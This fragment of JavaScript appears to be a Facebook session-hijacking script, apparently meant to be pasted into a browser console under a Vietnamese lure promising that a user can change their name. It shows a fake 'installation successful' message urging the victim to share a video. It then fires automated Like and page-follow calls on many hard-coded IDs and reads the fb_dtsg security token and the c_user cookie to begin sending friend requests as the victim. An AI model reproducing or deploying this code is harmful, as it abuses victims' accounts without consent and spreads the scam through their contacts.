...
"chars" : " :) ",
	...
	html += '<span style="vertical-align: middle;"><img src="http://img2.wikia.nocookie.net/__cb20101216053203/wowwiki/images/b/b2/Icon-facebook-22x22.png"></img></span>';
	html += '</a>';
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/photo.php?v=281489535364382" target="_blank">CÀI ĐẶT THÀNH CÔNG! Bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng Click vào đây và chia sẻ Video này sau 5 phút và không quá 60 phút kể từ khi đọc thông báo này. Ứng dụng sẽ bắt đầu tính thời gian chờ ngay sau khi bạn chia sẻ Video. Trong thời gian chờ vẫn sử dụng Facebook như bình thường. Ứng dụng được phát triển bởi Cộng đồng IT Việt.<br>IT VIỆT</a>';
	html += '</div>';
...
// pic + fans
P("453984881403383");P("188444301351675");P("761967430497771");P("324768284334638");P("286473548154518");P("124836494318225");P("440402252761646");P("443188135816391");Like("744143602280154");Like("255155514657467");Like("603318463070246");Like("481463958622037");Like("364239713695256");Like("611465492262020");Like("1460741184158086");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
